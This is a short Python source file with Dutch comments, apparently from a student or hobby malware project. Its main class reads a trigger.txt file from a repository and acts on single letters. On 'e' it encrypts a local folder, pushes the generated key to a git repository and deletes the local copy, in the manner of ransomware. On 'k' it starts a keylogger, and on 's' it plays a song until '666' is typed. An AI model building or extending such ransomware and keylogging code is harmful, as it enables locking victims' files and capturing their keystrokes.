
from Trigger_Encrypt_ import FolderEncryptor
from PerfectDay import MusicPlayer
from WriteKeys import Keywriter
from GenerateKey import KeyGenerator
from Repo import Git

class WordChecker:
    def __init__(self, repo_path):
        self.repo_path = repo_path

   

    def check_trigger_file(self):
        
        
        trigger_file_path = self.repo_path + '/trigger.txt'
        with open(trigger_file_path, 'r') as file:
            content = file.read()
            for letter in content:
                # Als de letter "e" van "encrypt" in de content staat, dan wordt de folder versleuteld.
                # Vervolgens wordt de Key.txt gepusht naar de repository en daarna verwijderd
                if "e" == letter:
                # Genereer een sleutel en sla deze op in een bestand
                    key_generator = KeyGenerator()
                    key_generator.generate_and_save_key("Key.txt") 
                # Pas de paths aan naar de juiste locatie, zowel voor de folder als voor de key.

                    folder_path = "Project_def/Main/Classes/te_versleutelen_folder"
                    key_file_path = "Project_def/Main/Classes/Key.txt"

                    encryptor = FolderEncryptor(folder_path, key_file_path)
                    encryptor.encrypt_folder()
                # Push de Key.txt naar de repository
                    push_key = Git("C:/RepoClone/PythonProject_ext/Project_def/Main/Classes/Key.txt")   
                    push_key.git_push()

                # Verwijder de Key.txt
                    key_generator.clear_key_file()

               
                    

                print("Alles is succesvol versleuteld.")

                # Als de letter "s" van "sympathy" in de content staat, dan wordt het nummer "Sympathy for the Devil" afgespeeld.
                if "s" == letter:
                    music_file = "sympathy_for_the_devil.mp3"
                    player = MusicPlayer(music_file)
                    player.play_music()

                    # Stop het afspelen als de gebruiker "666" invoert
                    user_input = ""
                    while user_input != "666":
                    # Rolling Stones - Sympathy for the Devil
                        user_input = input("Tell me what's my name: ")

                    player.stop_music()
                # Als de letter "k" van "keylogger" in de content staat, dan wordt de keylogger gestart.   
                if "k" == letter:
                    log_file = "keylogs.txt"
                    write = Keywriter(log_file)
                    write.start_logging()
     
                   
      



